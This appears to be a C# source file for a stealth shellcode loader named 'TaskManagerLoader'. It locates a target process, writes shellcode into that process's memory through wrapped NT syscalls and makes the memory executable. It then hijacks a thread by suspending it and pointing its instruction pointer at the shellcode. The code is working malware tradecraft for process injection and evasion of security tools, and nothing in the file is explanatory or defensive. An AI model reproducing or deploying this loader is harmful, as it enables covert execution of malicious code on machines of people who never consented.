using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;

namespace TaskManagerLoader
{
    public static class StealthInjection
    {
        public static int FindProcessStealth(string processName)
        {
            try
            {
                Process[] processes = Process.GetProcessesByName(processName.Replace(".exe", ""));
                if (processes.Length > 0)
                    return processes[0].Id;
            }
            catch { }
            return 0;
        }

        public static int FindThread(int processId)
        {
            try
            {
                Process process = Process.GetProcessById(processId);
                if (process.Threads.Count > 0)
                    return process.Threads[0].Id;
            }
            catch { }
            return 0;
        }

        public static bool InjectShellcode(int targetPid, byte[] shellcode)
        {
            if (shellcode == null || shellcode.Length == 0)
                return false;

            if (!NtSyscalls.Initialize())
                return false;

            IntPtr hProcess = NtSyscalls.NtOpenProcess(targetPid, NativeConstants.PROCESS_ALL_ACCESS);
            if (hProcess == IntPtr.Zero)
                return false;

            int targetTid = FindThread(targetPid);
            if (targetTid == 0)
            {
                NtSyscalls.NtClose(hProcess);
                return false;
            }

            IntPtr hThread = NtSyscalls.NtOpenThread(targetTid, NativeConstants.THREAD_ALL_ACCESS);
            if (hThread == IntPtr.Zero)
            {
                NtSyscalls.NtClose(hProcess);
                return false;
            }

            IntPtr shellcodeAddr = NtSyscalls.NtAllocateVirtualMemory(hProcess, (uint)shellcode.Length,
                NativeConstants.MEM_COMMIT | NativeConstants.MEM_RESERVE, NativeConstants.PAGE_READWRITE);

            if (shellcodeAddr == IntPtr.Zero)
            {
                NtSyscalls.NtClose(hThread);
                NtSyscalls.NtClose(hProcess);
                return false;
            }

            uint bytesWritten;
            if (!NtSyscalls.NtWriteVirtualMemory(hProcess, shellcodeAddr, shellcode, out bytesWritten))
            {
                NtSyscalls.NtClose(hThread);
                NtSyscalls.NtClose(hProcess);
                return false;
            }

            uint oldProtect;
            IntPtr shellcodeAddrRef = shellcodeAddr;
            if (!NtSyscalls.NtProtectVirtualMemory(hProcess, ref shellcodeAddrRef, (uint)shellcode.Length,
                NativeConstants.PAGE_EXECUTE_READ, out oldProtect))
            {
                NtSyscalls.NtClose(hThread);
                NtSyscalls.NtClose(hProcess);
                return false;
            }

            uint suspendCount = NtSyscalls.NtSuspendThread(hThread);
            if (suspendCount == 0xFFFFFFFF)
            {
                NtSyscalls.NtClose(hThread);
                NtSyscalls.NtClose(hProcess);
                return false;
            }

            Thread.Sleep(50);

            CONTEXT64 threadContext = new CONTEXT64();
            threadContext.ContextFlags = NativeConstants.CONTEXT_FULL;
            IntPtr contextPtr = Marshal.AllocHGlobal(Marshal.SizeOf(threadContext));
            Marshal.StructureToPtr(threadContext, contextPtr, false);

            if (!GetThreadContext(hThread, contextPtr))
            {
                Marshal.FreeHGlobal(contextPtr);
                NtSyscalls.NtResumeThread(hThread);
                NtSyscalls.NtClose(hThread);
                NtSyscalls.NtClose(hProcess);
                return false;
            }

            threadContext = (CONTEXT64)Marshal.PtrToStructure(contextPtr, typeof(CONTEXT64));
            threadContext.Rip = (ulong)shellcodeAddr.ToInt64();
            Marshal.StructureToPtr(threadContext, contextPtr, true);

            if (!SetThreadContext(hThread, contextPtr))
            {
                Marshal.FreeHGlobal(contextPtr);
                NtSyscalls.NtResumeThread(hThread);
                NtSyscalls.NtClose(hThread);
                NtSyscalls.NtClose(hProcess);
                return false;
            }

            NtSyscalls.NtResumeThread(hThread);
            Thread.Sleep(2000);

            suspendCount = NtSyscalls.NtSuspendThread(hThread);
            if (suspendCount != 0xFFFFFFFF)
            {
                threadContext.ContextFlags = NativeConstants.CONTEXT_FULL;
                Marshal.StructureToPtr(threadContext, contextPtr, false);
                if (GetThreadContext(hThread, contextPtr))
                {
                    threadContext = (CONTEXT64)Marshal.PtrToStructure(contextPtr, typeof(CONTEXT64));
                }
                NtSyscalls.NtResumeThread(hThread);
            }

            Marshal.FreeHGlobal(contextPtr);
            NtSyscalls.NtClose(hThread);
            NtSyscalls.NtClose(hProcess);

            return true;
        }

        [DllImport("kernel32.dll")]
        private static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll")]
        private static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("ntdll.dll")]
        private static extern int NtClose(IntPtr Handle);
    }
}

